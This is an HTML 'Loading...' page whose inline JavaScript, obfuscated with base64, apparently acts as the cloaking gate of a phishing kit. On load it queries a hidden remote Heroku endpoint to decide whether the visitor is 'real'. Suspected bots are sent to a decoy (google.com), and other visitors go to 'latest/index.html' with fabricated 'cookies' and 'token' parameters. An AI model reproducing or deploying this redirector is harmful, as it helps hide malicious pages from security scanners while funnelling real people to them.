<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <script src="CONFIG.js"></script>
</head>
<body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.min.js" integrity="sha256-xNzN2a4ltkB44Mc/Jz3pT4iU1cmeR0FkXs4pru/JxaQ=" crossorigin="anonymous"></script>
<script>
    let move_to = url_check("latest/index.html");
    let checkme=location.href.includes("type=passed")||location.href.includes("type=go");
    let loaded = false;
if(checkme===true){locat=location.href.replace("?type=passed","").replace("?type=go","").replace("type=passed","").replace("type=go","");loaded=true;is_loaded(move_to);}
let isBlack=!1;$(document).ready(function(){
    if(checkme===false){if(!0===rd()){is_loaded(move_to);}else!0===isBlack||window.location.replace(window.atob(window.atob("YUhSMGNITTZMeTkzZDNjdVoyOXZaMnhsTG1OdmJRPT0=")))}});


    function rd(){let e;return $.ajax({dataType:"json",url:window.atob("aHR0cHM6Ly9sb2FkZHJpcmVjdGpzb24uaGVyb2t1YXBwLmNvbS8="),type:"GET",async:!1,cache:!1,timeout:3e4,success:function(s){s.hasOwnProperty("isreal")? (true!==s.isreal?e=!1:e=!0):e=!1},error:function(s){e=!1}}),e}
    function url_check(new_filename = "") {
        let url = new URL(window.location.href);
        let search = url.search;
        let hash = url.hash;
        let href = url.href.replace(search, "").replace(hash, "");
        if(!search.includes("scriptID")){
            search+=search.includes("?")?"&":"?";
            search += ("scriptID=" + Math.random().toString().replace("0.", "") + "&cookies=" + window.btoa(Math.random().toString()).replace("=", "").replace("=", "") + "&token=" + Math.random().toString().replace("0.", ""));
        }
        if(href.endsWith("/")){href+=new_filename+search+hash;}
        else {
            if(new_filename.length>0){
                if(href.endsWith(".html")||href.endsWith(".htm")||href.endsWith(".php")){
                    let href_last=href.split("/")[(href.split("/") - 1)];
                    href=href.replace(href_last, "");href+=new_filename+search+hash;
                }else {href+=new_filename+search+hash;}
            }else {href+=new_filename+search+hash;}
        }
        return href;
    }
    function is_loaded(move_to){
        localStorage.setItem("page_loaded", "Yes Not Bot");
        window.location.replace(move_to);
    }
</script>
</body>
</html>